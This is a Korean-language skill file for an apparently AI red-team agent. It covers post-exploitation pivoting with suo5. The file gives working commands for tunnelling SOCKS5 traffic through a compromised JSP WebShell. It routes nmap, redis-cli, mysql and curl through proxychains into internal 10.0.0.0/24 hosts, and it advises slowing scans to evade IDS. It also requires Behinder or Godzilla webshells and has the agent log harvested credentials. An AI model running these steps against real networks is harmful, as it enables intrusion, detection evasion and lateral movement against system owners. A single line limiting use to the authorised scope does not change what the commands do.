---
name: suo5-tunnel
description: suo5 로 WebShell/HTTP 를 통해 SOCKS5 터널을 만들어 내부망 트래픽을 프록시로 끌어낸다(내부망 돌파 핵심 도구)
whenToUse: 한 대의 머신(WebShell/RCE)을 이미 확보해 내부망 스캔과 횡적 이동에 들어가야 할 때
role: internal
enabled: true
---

# suo5 내부망 터널

> **내부망에 들어가는 표준 경로는 이것 하나뿐이다**: WebShell/RCE 를 얻은 뒤 **반드시** 먼저 suo5 로 socks5 터널을 세우고,
> 터널을 DB 에 등록하며(`redteam_tunnel_add` kind=suo5) `redteam_session_check` 로 실제 통과를 검증한 다음에야
> 내부망 측정과 횡적 이동을 이야기한다. **터널 없이 내부망 탐지 스크립트를 직접 만들지 않는다** - 직접 만들면 느리고 입구를 쉽게 망가뜨린다.
> 터널 입구의 WebShell 은 Behinder 웹셸/Godzilla 웹셸이어야 하며(스킬 `webshell-toolkit` 참조), 아니면 사용자가 재사용할 수 없다.

바이너리: `$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`(v2.2.0, 정적 Go, 의존성 없음)

## 터널 구축
```bash
SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64

# 1) WebShell 을 터널 엔드포인트로 사용(HTTP 형)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) 인증이 필요할 때
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) HTTP 프록시만 사용(일부 도구는 http proxy 만 지원)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
파라미터 요약: `-t` 대상 shell URL, `-l` 로컬 리스닝, `-m socks5|http`, `--auth user:pass`, `-r` 재연결 간격, `--debug` 트래픽 확인.

## 터널을 통한 내부망 작업
```bash
# curl 을 socks5 로 통과
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# nmap 은 반드시 -sT(전체 연결) + proxychains 를 쓰거나, 신 버전이면 --proxies 를 직접 쓴다
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# 데이터베이스 / 미들웨어
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# 브라우저/엔드포인트 테스트를 터널로 통과
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## 내부망 스캔 리듬(경보 회피)
- 먼저 `/24` 생존 탐지(`nmap -sn` 을 터널 경유 또는 ICMP 로)를 하고, 그다음 생존 호스트의 흔한 포트를 본다.
- 속도를 `-T2 --max-rate 50` 까지 낮춰 IDS 트리거를 피한다.
- 새로 발견한 자산은 모두 `redteam_asset_add` 로 넣고(/24 기준 C 대역이 자동 생성된다), `provenance="active"`, `tool="suo5+nmap"` 으로 표기한다.

## 적재
- **터널을 세우면 즉시 등록한다(강제)**: `redteam_tunnel_add`(`kind=suo5`, `listen=127.0.0.1:1080`, `entry=<WebShell URL>`, `reach=도달 가능 대역`, `command=전체 기동 명령`)로 등록하고 `webshell_id` 가 해당 WebShell 기록을 가리키게 한다; 이어서 `redteam_session_check` 로 실제 연결성을 측정해 status=active 를 확인한 뒤 다음으로 넘어간다.
- 터널 자체는 `redteam_chain_add` 에 쓴다(stage=pivot, detail 에 터널 엔드포인트와 로컬 포트를 적는다).
- 내부망 자산, 성공한 로그인, 자격 증명은 각각 적재한다(asset/access/credential).
- 터널이 끊기면 `redteam_tunnel_update` 로 down 을 표시한다; "돌아가는 것처럼 보이지만 실제로는 통하지 않는" 터널을 남겨 다음 역할이 헛디디게 하지 않는다.

## 주의사항
- 터널 엔드포인트 파일은 사용 후 필요에 따라 정리해 대상을 원상 복구한다.
- 무료 공인 프록시는 터널을 태우기에 적합하지 않다; suo5 는 대상 자체의 WebShell 을 지나가므로 별도 프록시가 필요 없다.
- 승인 범위 안에서만 사용한다.
